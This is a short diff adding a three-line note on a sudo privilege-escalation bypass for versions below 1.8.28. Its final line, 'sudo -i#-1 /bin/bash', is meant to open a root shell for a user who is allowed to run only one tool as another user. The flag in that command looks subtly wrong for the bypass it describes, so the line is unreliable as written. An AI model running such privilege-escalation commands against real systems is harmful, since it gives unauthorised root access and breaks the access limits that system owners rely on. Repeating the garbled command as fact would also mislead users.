@@ -1,0 +1,3 @@
+### User must have SUDO access to one tool.
+### may still be present in older versions of Sudo (versions < 1.8.28)
+sudo -i#-1 /bin/bash 
